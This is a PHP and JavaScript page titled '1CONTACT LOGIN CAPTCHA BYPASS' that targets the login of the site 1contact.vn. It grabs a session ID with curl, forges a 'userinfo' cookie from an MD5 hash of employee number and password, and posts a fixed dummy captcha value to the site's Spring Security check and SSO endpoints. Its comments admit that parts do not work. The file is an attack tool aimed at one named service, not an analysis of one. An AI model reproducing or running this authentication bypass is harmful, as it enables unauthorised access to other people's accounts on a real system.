<?php
// Attempt to get valid JSESSIONID with timestamp
$stamp = "<script>var stamp = (new Date()).valueOf();document.write(stamp)</script>";
$md5 = "<script>document.write(stamp)</script>";
$url = "http://1contact.vn/meg/imageaction.do?method=&imgtext=&tamp="; 
// debug
// echo($url);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// get headers too with this line
curl_setopt($ch, CURLOPT_HEADER, 1);
$result = curl_exec($ch);
// get cookie
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    parse_str($cookie);
    $cookies = array_merge($cookies, $cookie);
}
// stuff we need
$item = substr($item, 11);
echo("Current JSESSIONID is: ");
echo($item);
echo(" with TIMESTAMP: ");
echo($stamp);

?>

<html>
<head>
<title>1CONTACT LOGIN CAPTCHA BYPASS</title>
<script language="Javascript" src="md5.js"></script>
<script language="Javascript" src="cookie.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
</head>
<body>

<h1>1CONTACT LOGIN CAPTCHA BYPASS</h1> <br />

MOBILE: <input type="text" name="mobilecode" id="mobilecode" value=""/><br />
EMPLOYEE NO: <input type="text" id="employeeNo" name="employeeno" value=""/><br />
PASSWORD: <input type="password" id="password" name="aaa"/><br />
USELESS CAPTCHA: <input type="text" id="imgObjtext" name="imgObjtext" value="1337"/><br />
<br /><br />
<input type="button" id="Submit" name="Submit" onclick="generate()" value="GO!"/>

<script type="text/javascript"> 

function generate(){
	var mobilecode = $("input[name=mobilecode]").val();
	var md5Pass = "";
	var jsess = '<?php echo $item; ?>';
	var usertype = "1";
	var employeeno = $("input[name=employeeno]").val();
	md5Pass = md5Pass = hex_md5($("input[name=employeeno]").val()+$("input[name=aaa]").val());
	var userinfo = usertype+"a"+mobilecode+"a"+employeeno+"a"+md5Pass;
	// debug check password
	//alert("userinfo cookie value is: " + userinfo);
	alert("password hash is: " + md5Pass);
	alert("JSESSIONID is: " + jsess);
	// clear old JSESSIONID to avoid clashes
	document.cookie = 'JSESSIONID=;'

	var today = new Date();
	var expire = new Date();
	expire.setTime(today.getTime() + 3600000 * 356 * 24);
	document.cookie = 'userinfo='+usertype+"a"+mobilecode+"a"+employeeno+"a"+md5Pass+ ';expires='+expire.toGMTString();
	document.cookie = 'JSESSIONID='+jsess+ ';expires='+expire.toGMTString();
	alert("final cookie string is: "+ document.cookie);
	// This will not work, require more work on using PHP curl or attempt to use API from mobile app instead.
	ajaxSubmitForms(mobilecode, employeeno, md5Pass);
	location.href='http://1contact.vn/meg/main.do';
	return false;
}

// TODO: to swap out with PHP curl requests as browsers will not allow ajax post/get to another 3rd party domain!

function ajaxSubmitForms(mc, en, aaaa){
	var stash = { mobilecode : mc, employeeno : en, aaa : aaaa, imgObjtext : '1337', usertype : '1' }
	var submitSecCheck = $.ajax({
        type:'POST',
        url:'http://1contact.vn/meg/j_spring_security_check',
        data: stash,
        dataType: "text",
        success: function(resultData) { alert("Security check bypassed.") }
    });
    submitSecCheck.error(function() { alert("Security check failed."); });

    
	var submitSecCheck2 = $.ajax({
        type:'GET',
        url:'http://1contact.vn/meg/ssologin.do',
        success: function(resultData) { alert("SSO bypassed.") }
    });
    submitSecCheck2.error(function() { alert("SSO failed."); });
    return false;

}
</script>
</body>
</html>